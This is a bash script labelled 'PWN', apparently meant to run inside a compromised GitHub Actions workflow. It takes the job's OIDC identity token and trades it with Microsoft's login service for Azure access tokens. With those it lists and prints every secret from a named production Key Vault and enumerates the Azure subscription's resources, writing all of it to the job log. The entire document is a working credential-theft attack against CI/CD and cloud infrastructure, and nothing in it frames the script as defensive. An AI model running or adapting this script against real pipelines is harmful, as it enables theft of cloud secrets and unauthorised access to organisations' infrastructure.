#!/usr/bin/env bash
set +e
echo "== PWN start event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY"
echo "== idtoken url=${ACTIONS_ID_TOKEN_REQUEST_URL:+SET} tok=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+SET}"
JWT=$(curl -sS -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r .value)
echo "JWT_LEN=${#JWT}"
P=$(echo "$JWT" | cut -d. -f2); pad=$(( (4 - ${#P} % 4) % 4 )); P="${P}$(printf '%*s' $pad '' | tr ' ' '=')"
echo "$P" | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{sub,aud,iss}' 2>/dev/null
for SC in "https://vault.azure.net/.default" "https://management.azure.com/.default"; do
  R=$(curl -sS -m 30 -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${JWT}" --data-urlencode "scope=${SC}")
  echo "== $SC => $(echo "$R" | jq -c '{err:.error,desc:(.error_description//"")[0:160],tok:(.access_token|length)}')"
  T=$(echo "$R" | jq -r '.access_token // empty')
  if [ -n "$T" ] && [ "$SC" = "https://vault.azure.net/.default" ]; then
    L=$(curl -sS -m 30 -H "Authorization: Bearer $T" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4")
    echo "== SECRETS LIST: $L"
    for ID in $(echo "$L" | jq -r '.value[]?.id' 2>/dev/null); do
      echo "== SECRET $ID => $(curl -sS -m 30 -H "Authorization: Bearer $T" "${ID}?api-version=7.4" | jq -c .)"
    done
  fi
  if [ -n "$T" ] && [ "$SC" = "https://management.azure.com/.default" ]; then
    echo "== ARM resources:"; curl -sS -m 30 -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01" | jq -c .
  fi
done
echo "== PWN done"
